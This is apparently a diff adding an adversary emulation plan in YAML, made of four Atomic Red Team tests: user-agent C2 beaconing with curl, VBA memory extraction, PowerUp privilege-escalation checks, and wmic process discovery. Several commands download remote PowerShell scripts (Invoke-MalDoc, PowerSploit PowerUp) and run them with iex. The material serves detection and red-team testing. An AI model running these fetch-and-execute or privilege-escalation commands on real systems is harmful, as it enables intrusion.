@@ -1,0 +1,105 @@
+  - emulation_plan_details:
+      adversary_name: test
+      creation_time: 2024-11-11 02:17:35 UTC+0000
+  - uuid: 2d7c471a-e887-4b78-b0dc-b0df1f2e0658
+    name: Malicious User Agents - Nix
+    id: T1071.001
+    source: ART
+    supported_platforms:
+      - linux
+      - macos
+    tactics:
+      - Command and Control
+    technique: 'Application Layer Protocol: Web Protocols'
+    description: |
+      This test simulates an infected host beaconing to command and control.
+      Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+    executor:
+      command: |
+        curl -s -A "HttpBrowser/1.0" -m3 #{domain}
+        curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
+        curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
+        curl -s -A "*<|>*" -m3 #{domain}
+      name: sh
+    arguments:
+      domain:
+        description: Default domain to simulate against
+        type: string
+        default: www.google.com
+    dependencies: []
+  - uuid: 8faff437-a114-4547-9a60-749652a03df6
+    name: Extract Memory via VBA
+    id: T1059.005
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique: 'Command and Scripting Interpreter: Visual Basic'
+    description: |
+      This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this
+      we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that
+      memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.
+    executor:
+      command: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"
+      cleanup_command: |
+        Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
+      name: powershell
+    arguments:
+      ms_product:
+        description: Maldoc application Word
+        type: string
+        default: Word
+    dependencies:
+      - description: |
+          Microsoft #{ms_product} must be installed
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: |
+          Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+  - uuid: 1289f78d-22d2-4590-ac76-166737e1811b
+    name: PowerUp Invoke-AllChecks
+    id: T1059.001
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique: 'Command and Scripting Interpreter: PowerShell'
+    description: |
+      Check for privilege escalation paths using PowerUp from PowerShellMafia
+    executor:
+      command: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
+        Invoke-AllChecks
+      name: powershell
+    arguments: []
+    dependencies: []
+  - uuid: 640cbf6d-659b-498b-ba53-f6dd1a1cc02c
+    name: Process Discovery - wmic process
+    id: T1057
+    source: ART
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique: Process Discovery
+    description: |
+      Utilize windows management instrumentation to identify processes.
+
+      Upon successful execution, WMIC will execute process to list processes. Output will be via stdout. 
+    executor:
+      command: |
+        wmic process get /format:list
+      name: command_prompt
+    arguments: []
+    dependencies: []
